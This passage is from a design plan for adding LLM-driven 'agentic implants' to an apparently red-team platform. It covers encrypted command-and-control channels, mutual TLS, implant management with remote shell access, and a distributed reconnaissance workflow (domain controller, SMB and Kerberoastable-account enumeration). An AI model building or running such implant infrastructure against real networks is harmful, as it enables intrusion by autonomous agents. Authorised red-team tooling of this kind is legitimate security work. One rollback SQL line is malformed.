    const key = Buffer.from(implant.encryptionKey, 'hex');
    const iv = Buffer.from(encryptedMessage.iv, 'base64');
    const authTag = Buffer.from(encryptedMessage.authTag, 'base64');
    const ciphertext = Buffer.from(encryptedMessage.ciphertext, 'base64');

    const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
    decipher.setAuthTag(authTag);

    const plaintext = Buffer.concat([
      decipher.update(ciphertext),
      decipher.final()
    ]).toString('utf8');

    return JSON.parse(plaintext);
  }
}

interface EncryptedMessage {
  ciphertext: string;
  iv: string;
  authTag: string;
  timestamp: number;
}
```

#### 2. Mutual TLS Configuration
Both control plane and implant authenticate each other using X.509 certificates.

```typescript
// TLS configuration for rust-nexus controller
import { readFileSync } from 'fs';
import { createServer } from 'https';

const tlsConfig = {
  // Server certificate and private key
  cert: readFileSync('/etc/rtpi/certs/controller.crt'),
  key: readFileSync('/etc/rtpi/certs/controller.key'),

  // CA certificate for client verification
  ca: readFileSync('/etc/rtpi/certs/ca.crt'),

  // Require client certificates (mutual TLS)
  requestCert: true,
  rejectUnauthorized: true,

  // TLS 1.3 only
  minVersion: 'TLSv1.3' as const,

  // Strict ciphers for perfect forward secrecy
  ciphers: [
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_128_GCM_SHA256'
  ].join(':'),

  // ECDH curves for key exchange
  ecdhCurve: 'X25519:prime256v1:secp384r1'
};

const httpsServer = createServer(tlsConfig);
```

#### 3. Per-Implant Key Generation
Each implant receives a unique encryption key at compile-time.

```typescript
/**
 * Generate unique keys for new implant
 */
function generateImplantKeys(): ImplantKeys {
  // Master encryption key (AES-256 requires 32 bytes)
  const encryptionKey = crypto.randomBytes(32).toString('hex');

  // Authentication token (256 bits)
  const authToken = crypto.randomBytes(32).toString('hex');
  const authTokenHash = crypto.createHash('sha256').update(authToken).digest('hex');

  // Generate X.509 certificate for this implant
  const { cert, privateKey } = generateClientCertificate();

  return {
    encryptionKey,
    authToken,
    authTokenHash,
    certificate: cert,
    privateKey
  };
}
```

#### 4. Perfect Forward Secrecy (ECDH)
Session keys are derived using Elliptic Curve Diffie-Hellman.

```typescript
/**
 * Establish session with ECDH key exchange
 */
async function establishSecureSession(implantId: string): Promise<SessionKeys> {
  // Generate ephemeral ECDH key pair (control plane)
  const serverECDH = crypto.createECDH('X25519');
  const serverPublicKey = serverECDH.generateKeys();

  // Send public key to implant, receive implant's public key
  const implantPublicKey = await exchangePublicKeys(implantId, serverPublicKey);

  // Derive shared secret
  const sharedSecret = serverECDH.computeSecret(implantPublicKey);

  // Derive session keys using HKDF
  const sessionKey = crypto.hkdfSync(
    'sha256',
    sharedSecret,
    Buffer.from('rtpi-implant-session'),
    Buffer.from(implantId),
    32 // 256-bit key
  );

  return {
    sessionKey: sessionKey.toString('hex'),
    expiresAt: new Date(Date.now() + 6 * 60 * 60 * 1000) // 6 hours
  };
}
```

### Authentication

#### 1. Token-Based Authentication
Implants authenticate using SHA-256 hashed tokens.

```typescript
/**
 * Authenticate implant connection
 */
async function authenticateImplant(token: string): Promise<Implant | null> {
  const tokenHash = crypto.createHash('sha256').update(token).digest('hex');

  const implant = await db.query.agenticImplants.findFirst({
    where: (implants, { eq }) => eq(implants.authTokenHash, tokenHash)
  });

  if (!implant) {
    console.warn('[Auth] Invalid token attempt');
    return null;
  }

  // Check if implant is not killed/disabled
  if (implant.status === 'killed' || implant.status === 'disabled') {
    console.warn(`[Auth] Blocked authentication from ${implant.status} implant: ${implant.id}`);
    return null;
  }

  console.log(`[Auth] Implant authenticated: ${implant.id}`);
  return implant;
}
```

#### 2. Automatic Token Rotation (Every 24 hours)
Tokens are automatically rotated to limit compromise window.

```typescript
/**
 * Rotate authentication token for implant
 */
async function rotateAuthToken(implantId: string): Promise<void> {
  const newToken = crypto.randomBytes(32).toString('hex');
  const newTokenHash = crypto.createHash('sha256').update(newToken).digest('hex');

  // Update database
  await db
    .update(agenticImplants)
    .set({
      authTokenHash: newTokenHash,
      lastTokenRotation: new Date()
    })
    .where(eq(agenticImplants.id, implantId));

  // Send new token to implant over secure channel
  const ws = rustNexusController.getConnection(implantId);
  if (ws) {
    const encrypted = secureCommunication.encryptMessage(implantId, {
      type: 'token_rotation',
      newToken
    });

    ws.send(JSON.stringify(encrypted));
  }

  console.log(`[Auth] Token rotated for implant: ${implantId}`);
}

// Automatic rotation every 24 hours
setInterval(async () => {
  const implants = await db.select().from(agenticImplants).where(eq(agenticImplants.status, 'active'));

  for (const implant of implants) {
    const lastRotation = implant.lastTokenRotation || implant.createdAt;
    const hoursSinceRotation = (Date.now() - lastRotation.getTime()) / (1000 * 60 * 60);

    if (hoursSinceRotation >= 24) {
      await rotateAuthToken(implant.id);
    }
  }
}, 60 * 60 * 1000); // Check every hour
```

#### 3. Certificate-Based Authentication (Mutual TLS)
X.509 certificates provide cryptographic proof of identity.

```typescript
/**
 * Generate client certificate for implant
 */
function generateClientCertificate(implantId: string): Certificate {
  const privateKey = crypto.generateKeyPairSync('rsa', {
    modulusLength: 4096,
    publicKeyEncoding: { type: 'spki', format: 'pem' },
    privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
  });

  // Create CSR (Certificate Signing Request)
  const csr = createCSR(implantId, privateKey.publicKey);

  // Sign with CA (Certificate Authority)
  const cert = signCertificate(csr, {
    validity: 7 * 24 * 60 * 60 * 1000, // 7 days
    serialNumber: crypto.randomBytes(16).toString('hex'),
    subject: {
      CN: `implant-${implantId}`,
      O: 'RTPI',
      OU: 'Agentic Implants'
    }
  });

  return {
    certificate: cert,
    privateKey: privateKey.privateKey,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  };
}

/**
 * Verify client certificate on connection
 */
function verifyClientCertificate(peerCert: any): boolean {
  // Check certificate validity period
  const now = new Date();
  if (now < peerCert.valid_from || now > peerCert.valid_to) {
    console.warn('[TLS] Certificate expired or not yet valid');
    return false;
  }

  // Verify certificate is issued by our CA
  if (!verifyCertificateChain(peerCert)) {
    console.warn('[TLS] Certificate chain verification failed');
    return false;
  }

  // Check revocation list
  if (isCertificateRevoked(peerCert.serialNumber)) {
    console.warn('[TLS] Certificate has been revoked');
    return false;
  }

  return true;
}
```

#### 4. Certificate Pinning
Implants only trust the specific control plane certificate.

```rust
// In rust-nexus implant code (Rust)
const PINNED_CERT_HASH: &str = "sha256/8f3a..."; // SHA-256 hash of server cert

fn verify_server_certificate(cert: &Certificate) -> bool {
    let cert_hash = sha256(&cert.to_der().unwrap());
    let cert_hash_b64 = format!("sha256/{}", base64::encode(cert_hash));

    if cert_hash_b64 != PINNED_CERT_HASH {
        eprintln!("[Security] Server certificate pinning failed!");
        return false;
    }

    true
}
```

### Implementation Checklist
- [ ] Implement mutual TLS with client certificate verification
- [ ] Add per-implant AES-256-GCM encryption
- [ ] Implement ECDH session key exchange for perfect forward secrecy
- [ ] Add automatic token rotation (24h interval)
- [ ] Implement certificate generation and management
- [ ] Add certificate revocation list (CRL) support
- [ ] Implement certificate pinning in implants
- [ ] Add secure command channel with replay protection
- [ ] Implement encrypted data transfer for large payloads
- [ ] Add intrusion detection for authentication failures
- [ ] Test security measures (penetration testing, fuzzing)

### Security Monitoring

```typescript
/**
 * Monitor for security anomalies
 */
class SecurityMonitor {
  private failedAuthAttempts: Map<string, number> = new Map();

  /**
   * Track failed authentication attempts
   */
  recordFailedAuth(ipAddress: string): void {
    const attempts = this.failedAuthAttempts.get(ipAddress) || 0;
    this.failedAuthAttempts.set(ipAddress, attempts + 1);

    // Block after 5 failed attempts
    if (attempts + 1 >= 5) {
      this.blockIPAddress(ipAddress);
      console.error(`[Security] IP ${ipAddress} blocked due to multiple failed auth attempts`);
    }
  }

  /**
   * Detect replay attacks
   */
  checkReplayAttack(messageId: string, timestamp: number): boolean {
    // Message must be within 60 seconds
    const age = Date.now() - timestamp;
    if (age > 60000) {
      console.warn('[Security] Message too old - possible replay attack');
      return true;
    }

    // Check if we've seen this message ID before
    if (this.seenMessageIds.has(messageId)) {
      console.warn('[Security] Duplicate message ID - replay attack detected');
      return true;
    }

    this.seenMessageIds.set(messageId, Date.now());
    return false;
  }

  /**
   * Monitor for rate limiting violations
   */
  checkRateLimit(implantId: string): boolean {
    const windowMs = 60000; // 1 minute
    const maxRequests = 100;

    const requests = this.requestCounts.get(implantId) || [];
    const now = Date.now();

    // Remove old requests outside window
    const recentRequests = requests.filter(t => now - t < windowMs);

    if (recentRequests.length >= maxRequests) {
      console.warn(`[Security] Rate limit exceeded for implant ${implantId}`);
      return false;
    }

    recentRequests.push(now);
    this.requestCounts.set(implantId, recentRequests);
    return true;
  }
}
```

### Estimated Effort
4-5 days

---

## Implant Management UI

### Management Interface
```
┌─────────────────────────────────────────────────────────────────┐
│ Agentic Implants - Active: 5 | Idle: 2 | Offline: 1            │
├─────────────────────────────────────────────────────────────────┤
│ [+ Deploy New]  [Refresh]  [Mass Command]                       │
│                                                                 │
│ ┌──────────────────────────────────────────────────────────┐   │
│ │ 🟢 WIN-DC01 (192.168.1.10)                                │   │
│ │    Platform: Windows Server 2019                          │   │
│ │    Agent: GPT-4 Turbo | Autonomy: 7/10                   │   │
│ │    Tasks: 3 running | Last: 2 min ago                    │   │
│ │    [View] [Tasks] [Shell] [Kill]                         │   │
│ └──────────────────────────────────────────────────────────┘   │
│                                                                 │
│ ┌──────────────────────────────────────────────────────────┐   │
│ │ 🟢 UBUNTU-WEB (192.168.1.50)                              │   │
│ │    Platform: Ubuntu 22.04                                 │   │
│ │    Agent: Claude 3.5 | Autonomy: 5/10                    │   │
│ │    Tasks: 1 running | Last: 30 sec ago                   │   │
│ │    [View] [Tasks] [Shell] [Kill]                         │   │
│ └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

### Implementation Checklist
- [ ] Create implant list view
- [ ] Add status indicators
- [ ] Implement task monitoring
- [ ] Add shell/terminal access
- [ ] Implement kill switch
- [ ] Add telemetry dashboard
- [ ] Create deployment wizard

### Complete UI Implementation

```typescript
// client/src/pages/Implants.tsx

import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Card } from '@/components/ui/card';
import { DeploymentWizard } from '@/components/implants/DeploymentWizard';
import { ImplantTerminal } from '@/components/implants/ImplantTerminal';

interface Implant {
  id: string;
  hostname: string;
  ipAddress: string;
  platform: 'windows' | 'linux' | 'macos';
  status: 'active' | 'idle' | 'disconnected' | 'killed';
  agentType: string;
  agentModel: string;
  autonomyLevel: number;
  runningTasks: number;
  lastHeartbeat: Date;
  cpuUsage: number;
  memoryUsage: number;
  networkLatency: number;
}

export default function Implants() {
  const [implants, setImplants] = useState<Implant[]>([]);
  const [selectedImplant, setSelectedImplant] = useState<Implant | null>(null);
  const [showDeployWizard, setShowDeployWizard] = useState(false);
  const [showTerminal, setShowTerminal] = useState(false);

  useEffect(() => {
    fetchImplants();
    const interval = setInterval(fetchImplants, 5000); // Poll every 5 seconds
    return () => clearInterval(interval);
  }, []);

  async function fetchImplants() {
    const response = await fetch('/api/v1/implants');
    const data = await response.json();
    setImplants(data.implants);
  }

  async function handleKillSwitch(implantId: string) {
    if (!confirm('⚠️ WARNING: This will permanently terminate the implant. Continue?')) {
      return;
    }

    await fetch(`/api/v1/implants/${implantId}/kill`, {
      method: 'POST'
    });

    fetchImplants();
  }

  function getStatusColor(status: string): string {
    switch (status) {
      case 'active': return 'bg-green-500';
      case 'idle': return 'bg-blue-500';
      case 'disconnected': return 'bg-gray-500';
      case 'killed': return 'bg-red-500';
      default: return 'bg-gray-400';
    }
  }

  function getPlatformIcon(platform: string): string {
    switch (platform) {
      case 'windows': return '🪟';
      case 'linux': return '🐧';
      case 'macos': return '🍎';
      default: return '💻';
    }
  }

  return (
    <div className="p-8">
      <div className="flex justify-between items-center mb-6">
        <div>
          <h1 className="text-3xl font-bold">Agentic Implants</h1>
          <p className="text-muted-foreground mt-1">
            Active: {implants.filter(i => i.status === 'active').length} |
            Idle: {implants.filter(i => i.status === 'idle').length} |
            Offline: {implants.filter(i => i.status === 'disconnected').length}
          </p>
        </div>
        <div className="flex gap-3">
          <Button onClick={() => fetchImplants()}>Refresh</Button>
          <Button onClick={() => setShowDeployWizard(true)} variant="primary">
            + Deploy New
          </Button>
        </div>
      </div>

      {showDeployWizard && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-card p-6 rounded-lg max-w-2xl w-full">
            <DeploymentWizard
              operationId="current-operation"
              onComplete={(implantId) => {
                setShowDeployWizard(false);
                fetchImplants();
              }}
            />
            <Button onClick={() => setShowDeployWizard(false)} variant="outline" className="mt-4">
              Cancel
            </Button>
          </div>
        </div>
      )}

      {showTerminal && selectedImplant && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-card p-6 rounded-lg max-w-4xl w-full h-3/4">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xl font-bold">Terminal: {selectedImplant.hostname}</h2>
              <Button onClick={() => setShowTerminal(false)}>Close</Button>
            </div>
            <ImplantTerminal implantId={selectedImplant.id} />
          </div>
        </div>
      )}

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {implants.map((implant) => (
          <Card key={implant.id} className="p-6">
            <div className="flex justify-between items-start mb-4">
              <div className="flex items-center gap-2">
                <span className={`w-3 h-3 rounded-full ${getStatusColor(implant.status)}`}></span>
                <span className="text-xl">{getPlatformIcon(implant.platform)}</span>
                <div>
                  <h3 className="font-bold">{implant.hostname}</h3>
                  <p className="text-sm text-muted-foreground">{implant.ipAddress}</p>
                </div>
              </div>
              <Badge variant={implant.status === 'active' ? 'success' : 'default'}>
                {implant.status.toUpperCase()}
              </Badge>
            </div>

            <div className="space-y-2 mb-4">
              <div className="flex justify-between text-sm">
                <span>Platform:</span>
                <span className="font-medium">{implant.platform}</span>
              </div>
              <div className="flex justify-between text-sm">
                <span>Agent:</span>
                <span className="font-medium">{implant.agentModel}</span>
              </div>
              <div className="flex justify-between text-sm">
                <span>Autonomy:</span>
                <span className="font-medium">{implant.autonomyLevel}/10</span>
              </div>
              <div className="flex justify-between text-sm">
                <span>Running Tasks:</span>
                <span className="font-medium">{implant.runningTasks}</span>
              </div>
              <div className="flex justify-between text-sm">
                <span>Last Heartbeat:</span>
                <span className="font-medium">
                  {Math.floor((Date.now() - new Date(implant.lastHeartbeat).getTime()) / 1000)}s ago
                </span>
              </div>
            </div>

            <div className="space-y-1 mb-4">
              <div className="flex justify-between text-xs">
                <span>CPU:</span>
                <span>{(implant.cpuUsage * 100).toFixed(1)}%</span>
              </div>
              <div className="w-full bg-secondary h-1.5 rounded-full overflow-hidden">
                <div
                  className="bg-primary h-full"
                  style={{ width: `${implant.cpuUsage * 100}%` }}
                ></div>
              </div>

              <div className="flex justify-between text-xs mt-2">
                <span>Memory:</span>
                <span>{(implant.memoryUsage * 100).toFixed(1)}%</span>
              </div>
              <div className="w-full bg-secondary h-1.5 rounded-full overflow-hidden">
                <div
                  className="bg-blue-500 h-full"
                  style={{ width: `${implant.memoryUsage * 100}%` }}
                ></div>
              </div>

              <div className="flex justify-between text-xs mt-2">
                <span>Latency:</span>
                <span>{implant.networkLatency}ms</span>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-2">
              <Button
                size="sm"
                onClick={() => {
                  setSelectedImplant(implant);
                  // Show tasks view
                }}
              >
                View Tasks
              </Button>
              <Button
                size="sm"
                onClick={() => {
                  setSelectedImplant(implant);
                  setShowTerminal(true);
                }}
                disabled={implant.status !== 'active'}
              >
                Shell
              </Button>
              <Button
                size="sm"
                variant="outline"
                onClick={() => {
                  // Show details
                }}
              >
                Details
              </Button>
              <Button
                size="sm"
                variant="destructive"
                onClick={() => handleKillSwitch(implant.id)}
                disabled={implant.status === 'killed'}
              >
                Kill
              </Button>
            </div>
          </Card>
        ))}
      </div>

      {implants.length === 0 && (
        <div className="text-center py-12 bg-card rounded-lg border border-border">
          <h3 className="text-lg font-medium mb-2">No implants deployed</h3>
          <p className="text-muted-foreground mb-4">
            Deploy your first agentic implant to get started
          </p>
          <Button onClick={() => setShowDeployWizard(true)}>Deploy Implant</Button>
        </div>
      )}
    </div>
  );
}
```

### Estimated Effort
3-4 days

---

## Distributed Workflow Execution

### Execution Model

Distributed Workflow Execution enables the Agent Workflow Orchestrator to distribute tasks across multiple implants for parallel execution and scalability.

#### Integration with Agent Workflow Orchestrator

```typescript
// Integration point: server/services/agent-workflow-orchestrator.ts

import { taskDistributor } from './task-distributor';
import { rustNexusController } from './rust-nexus-controller';

// Add to AgentWorkflowOrchestrator class:

/**
 * Execute workflow with distributed implants
 */
async executeWorkflowDistributed(
  workflowId: string,
  implantIds?: string[]
): Promise<WorkflowResult> {
  const workflow = await db.query.agentWorkflows.findFirst({
    where: (workflows, { eq }) => eq(workflows.id, workflowId),
    with: {
      tasks: true
    }
  });

  if (!workflow) {
    throw new Error(`Workflow ${workflowId} not found`);
  }

  // Convert workflow tasks to distributed tasks
  const distributedTasks = workflow.tasks.map(task => ({
    id: task.id,
    type: task.type,
    command: task.command,
    parameters: task.parameters as Record<string, any>,
    requiredPlatform: task.requiredPlatform,
    requiredCapabilities: task.requiredCapabilities,
    priority: task.priority,
    timeout: task.timeout || 300000
  }));

  // Execute via task distributor
  const result = await taskDistributor.executeDistributed(
    workflowId,
    distributedTasks,
    implantIds
  );

  // Update workflow status
  await db
    .update(agentWorkflows)
    .set({
      status: result.overallStatus === 'completed' ? 'completed' : 'failed',
      output: result,
      completedAt: new Date()
    })
    .where(eq(agentWorkflows.id, workflowId));

  return result;
}
```

#### Example: Distributed Reconnaissance Workflow

```typescript
// Operation Lead Agent decides to run distributed reconnaissance

const reconWorkflow = {
  name: 'Distributed Network Reconnaissance',
  operationId: 'op-123',
  tasks: [
    {
      name: 'Enumerate Domain Controllers',
      type: 'reconnaissance',
      command: 'ldap_query',
      parameters: { query: '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))' },
      requiredPlatform: 'windows',
      priority: 'high',
      timeout: 60000
    },
    {
      name: 'Scan Internal Network',
      type: 'reconnaissance',
      command: 'nmap_scan',
      parameters: { target: '10.0.0.0/24', ports: '1-1000' },
      requiredCapabilities: ['port_scanning'],
      priority: 'medium',
      timeout: 300000
    },
    {
      name: 'Enumerate Shares',
      type: 'reconnaissance',
      command: 'smb_enum',
      parameters: { targets: ['dc01', 'fileserver01', 'backup01'] },
      requiredPlatform: 'windows',
      priority: 'medium',
      timeout: 120000
    },
    {
      name: 'Check for Kerberoastable Accounts',
      type: 'reconnaissance',
      command: 'kerberoast_enum',
      parameters: {},
      requiredPlatform: 'windows',
      priority: 'high',
      timeout: 90000
    }
  ]
};

// Workflow Orchestrator distributes tasks
// Task 1 → Windows implant on 10.0.1.50 (domain member)
// Task 2 → Linux implant on 10.0.0.100 (network scanner capabilities)
// Task 3 → Windows implant on 10.0.1.75 (same subnet as targets)
// Task 4 → Windows implant on 10.0.1.50 (domain member, reused)

const result = await agentOrchestrator.executeWorkflowDistributed(workflow.id);

// Results aggregated and sent to Technical Writer for report
```

### Implementation Checklist
- [ ] Integrate task distributor with existing workflow orchestrator
- [ ] Add implant selection logic to workflow tasks
- [ ] Implement distributed task execution
- [ ] Add result aggregation to workflow output
- [ ] Handle implant failures and task retries
- [ ] Add execution monitoring and progress tracking
- [ ] Create UI for distributed workflow visualization

### Estimated Effort
5-6 days

---

## Database Schema

### Implant Tables

#### agentic_implants
```sql
CREATE TABLE agentic_implants (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  hostname TEXT NOT NULL,
  ip_address TEXT,
  platform VARCHAR(20) NOT NULL,
  status VARCHAR(20) DEFAULT 'idle',
  agent_type VARCHAR(20) NOT NULL,
  agent_model TEXT,
  agent_capabilities JSONB DEFAULT '[]',
  autonomy_level INTEGER DEFAULT 5,
  encryption_key TEXT NOT NULL,
  auth_token_hash TEXT NOT NULL,
  permissions JSONB DEFAULT '[]',
  last_heartbeat TIMESTAMP,
  deployed_by UUID REFERENCES users(id),
  operation_id UUID REFERENCES operations(id),
  created_at TIMESTAMP DEFAULT NOW()
);
```

#### implant_tasks
```sql
CREATE TABLE implant_tasks (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  implant_id UUID NOT NULL REFERENCES agentic_implants(id) ON DELETE CASCADE,
  type VARCHAR(100) NOT NULL,
  command TEXT NOT NULL,
  parameters JSONB DEFAULT '{}',
  status VARCHAR(20) NOT NULL DEFAULT 'queued',
  priority VARCHAR(20) DEFAULT 'medium',
  timeout INTEGER DEFAULT 300000,
  start_time TIMESTAMP,
  end_time TIMESTAMP,
  result JSONB,
  error TEXT,
  created_at TIMESTAMP DEFAULT NOW() NOT NULL,
  updated_at TIMESTAMP DEFAULT NOW() NOT NULL
);

CREATE INDEX idx_implant_tasks_implant_id ON implant_tasks(implant_id);
CREATE INDEX idx_implant_tasks_status ON implant_tasks(status);
CREATE INDEX idx_implant_tasks_created_at ON implant_tasks(created_at DESC);
```

**Drizzle ORM Schema (shared/schema.ts):**
```typescript
export const implantTasks = pgTable('implant_tasks', {
  id: uuid('id').primaryKey().defaultRandom(),
  implantId: uuid('implant_id').notNull().references(() => agenticImplants.id, { onDelete: 'cascade' }),
  type: varchar('type', { length: 100 }).notNull(),
  command: text('command').notNull(),
  parameters: jsonb('parameters').default({}).notNull(),
  status: varchar('status', { length: 20 }).notNull().default('queued'),
  priority: varchar('priority', { length: 20 }).default('medium'),
  timeout: integer('timeout').default(300000),
  startTime: timestamp('start_time'),
  endTime: timestamp('end_time'),
  result: jsonb('result'),
  error: text('error'),
  createdAt: timestamp('created_at').defaultNow().notNull(),
  updatedAt: timestamp('updated_at').defaultNow().notNull()
});
```

#### implant_comms
```sql
CREATE TABLE implant_comms (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  implant_id UUID NOT NULL REFERENCES agentic_implants(id) ON DELETE CASCADE,
  direction VARCHAR(20) NOT NULL,
  message_type VARCHAR(50) NOT NULL,
  payload JSONB NOT NULL,
  encrypted BOOLEAN DEFAULT true,
  timestamp TIMESTAMP DEFAULT NOW() NOT NULL
);

CREATE INDEX idx_implant_comms_implant_id ON implant_comms(implant_id);
CREATE INDEX idx_implant_comms_timestamp ON implant_comms(timestamp DESC);
CREATE INDEX idx_implant_comms_direction ON implant_comms(direction);
CREATE INDEX idx_implant_comms_message_type ON implant_comms(message_type);
```

**Drizzle ORM Schema (shared/schema.ts):**
```typescript
export const implantComms = pgTable('implant_comms', {
  id: uuid('id').primaryKey().defaultRandom(),
  implantId: uuid('implant_id').notNull().references(() => agenticImplants.id, { onDelete: 'cascade' }),
  direction: varchar('direction', { length: 20 }).notNull(), // 'inbound' | 'outbound'
  messageType: varchar('message_type', { length: 50 }).notNull(),
  payload: jsonb('payload').notNull(),
  encrypted: boolean('encrypted').default(true),
  timestamp: timestamp('timestamp').defaultNow().notNull()
});
```

### Migration File
- **File:** `migrations/0008_add_agentic_implants.sql`

```sql
-- Migration: Add Agentic Implants Support
-- Date: 2025-12-19
-- Description: Adds tables for rust-nexus agentic implants, tasks, and communications

BEGIN;

-- Agentic Implants Table
CREATE TABLE IF NOT EXISTS agentic_implants (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  hostname TEXT NOT NULL,
  ip_address TEXT,
  platform VARCHAR(20) NOT NULL,
  status VARCHAR(20) DEFAULT 'idle',
  agent_type VARCHAR(20) NOT NULL,
  agent_model TEXT,
  agent_capabilities JSONB DEFAULT '[]',
  autonomy_level INTEGER DEFAULT 3,
  encryption_key TEXT NOT NULL,
  auth_token_hash TEXT NOT NULL,
  permissions JSONB DEFAULT '[]',
  last_heartbeat TIMESTAMP,
  last_token_rotation TIMESTAMP,
  deployed_by UUID REFERENCES users(id),
  operation_id UUID REFERENCES operations(id) ON DELETE SET NULL,
  cpu_usage DECIMAL(3,2) DEFAULT 0.0,
  memory_usage DECIMAL(3,2) DEFAULT 0.0,
  network_latency INTEGER DEFAULT 0,
  created_at TIMESTAMP DEFAULT NOW() NOT NULL,
  updated_at TIMESTAMP DEFAULT NOW() NOT NULL
);

-- Implant Tasks Table
CREATE TABLE IF NOT EXISTS implant_tasks (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  implant_id UUID NOT NULL REFERENCES agentic_implants(id) ON DELETE CASCADE,
  type VARCHAR(100) NOT NULL,
  command TEXT NOT NULL,
  parameters JSONB DEFAULT '{}',
  status VARCHAR(20) NOT NULL DEFAULT 'queued',
  priority VARCHAR(20) DEFAULT 'medium',
  timeout INTEGER DEFAULT 300000,
  start_time TIMESTAMP,
  end_time TIMESTAMP,
  result JSONB,
  error TEXT,
  created_at TIMESTAMP DEFAULT NOW() NOT NULL,
  updated_at TIMESTAMP DEFAULT NOW() NOT NULL
);

-- Implant Communications Log Table
CREATE TABLE IF NOT EXISTS implant_comms (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  implant_id UUID NOT NULL REFERENCES agentic_implants(id) ON DELETE CASCADE,
  direction VARCHAR(20) NOT NULL,
  message_type VARCHAR(50) NOT NULL,
  payload JSONB NOT NULL,
  encrypted BOOLEAN DEFAULT true,
  timestamp TIMESTAMP DEFAULT NOW() NOT NULL
);

-- Indexes for Performance
CREATE INDEX IF NOT EXISTS idx_agentic_implants_status ON agentic_implants(status);
CREATE INDEX IF NOT EXISTS idx_agentic_implants_operation_id ON agentic_implants(operation_id);
CREATE INDEX IF NOT EXISTS idx_agentic_implants_last_heartbeat ON agentic_implants(last_heartbeat DESC);

CREATE INDEX IF NOT EXISTS idx_implant_tasks_implant_id ON implant_tasks(implant_id);
CREATE INDEX IF NOT EXISTS idx_implant_tasks_status ON implant_tasks(status);
CREATE INDEX IF NOT EXISTS idx_implant_tasks_created_at ON implant_tasks(created_at DESC);

CREATE INDEX IF NOT EXISTS idx_implant_comms_implant_id ON implant_comms(implant_id);
CREATE INDEX IF NOT EXISTS idx_implant_comms_timestamp ON implant_comms(timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_implant_comms_direction ON implant_comms(direction);
CREATE INDEX IF NOT EXISTS idx_implant_comms_message_type ON implant_comms(message_type);

-- Triggers for Updated At
CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = NOW();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER update_agentic_implants_updated_at
  BEFORE UPDATE ON agentic_implants
  FOR EACH ROW
  EXECUTE FUNCTION update_updated_at_column();

CREATE TRIGGER update_implant_tasks_updated_at
  BEFORE UPDATE ON implant_tasks
  FOR EACH ROW
  EXECUTE FUNCTION update_updated_at_column();

COMMIT;
```

**Rollback Migration (`0008_rollback_agentic_implants.sql`):**
```sql
BEGIN;

DROP TRIGGER IF EXISTS update_implant_tasks_updated_at ON implant_tasks;
DROP TRIGGER IF EXISTS update_agentic_implants_updated_at ON agentic_implants;

DROP TABLE IF EXISTS implant_comms CASCADE;
DROP TABLE IF EXISTS implant_tasks CASCADE;
DROP TABLE IF NOT EXISTS agentic_implants CASCADE;

COMMIT;
```

---

## API Endpoints

### Implant Management API

#### GET /api/v1/implants

Get list of all implants with optional filtering.

**Query Parameters:**
- `status` (optional): Filter by status (`active`, `idle`, `disconnected`, `killed`)
- `operationId` (optional): Filter by operation
- `platform` (optional): Filter by platform (`windows`, `linux`, `macos`)

**Response:**
```json
{
  "implants": [
    {
      "id": "550e8400-e29b-41d4-a716-446655440000",
      "hostname": "WIN-DC01",
      "ipAddress": "10.0.1.50",
      "platform": "windows",
      "status": "active",
      "agentType": "anthropic",
      "agentModel": "claude-3.5-sonnet",
      "autonomyLevel": 5,
      "agentCapabilities": ["reconnaissance", "lateral_movement"],
      "runningTasks": 2,
      "lastHeartbeat": "2025-12-19T10:30:00Z",
      "cpuUsage": 0.15,
      "memoryUsage": 0.32,
      "networkLatency": 45,
      "operationId": "op-123",
      "createdAt": "2025-12-19T08:00:00Z"
    }
  ],
  "total": 5
}
```

**Implementation:**
```typescript
router.get('/implants', authenticateSession, async (req, res) => {
  const { status, operationId, platform } = req.query;

  let query = db.select().from(agenticImplants);

  if (status) {
    query = query.where(eq(agenticImplants.status, status as string));
  }

  if (operationId) {
    query = query.where(eq(agenticImplants.operationId, operationId as string));
  }

  if (platform) {
    query = query.where(eq(agenticImplants.platform, platform as string));
  }

  const implants = await query;

  res.json({
    implants,
    total: implants.length
  });
});
```

#### POST /api/v1/implants/register

Register a new implant (called by implant during deployment).

**Request Body:**
```json
{
  "authToken": "abc123...",
  "metadata": {
    "hostname": "WIN-DC01",
    "ipAddress": "10.0.1.50",
    "platform": "windows",
    "agentType": "anthropic",
    "agentModel": "claude-3.5-sonnet",
    "capabilities": ["reconnaissance", "lateral_movement"],
    "autonomyLevel": 5,
    "operationId": "op-123"
  }
}
```

**Response:**
```json
{
  "success": true,
  "implantId": "550e8400-e29b-41d4-a716-446655440000",
  "message": "Implant registered successfully"
}
```

**Implementation:**
```typescript
router.post('/implants/register', async (req, res) => {
  const { authToken, metadata } = req.body;

  // Authenticate implant
  const isValid = await rustNexusController.authenticateImplant(authToken);

  if (!isValid) {
    return res.status(401).json({
      success: false,
      error: 'Invalid authentication token'
    });
  }

  // Register implant
  const implantId = crypto.randomUUID();
  await rustNexusController.registerImplant(implantId, metadata);

  res.json({
    success: true,
    implantId,
    message: 'Implant registered successfully'
  });
});
```

#### POST /api/v1/implants/:id/task

Deploy a task to a specific implant.

**Request Body:**
```json
{
  "type": "reconnaissance",
  "command": "enumerate_domain",
  "parameters": {
    "target": "corp.local"
  },
  "priority": "high",
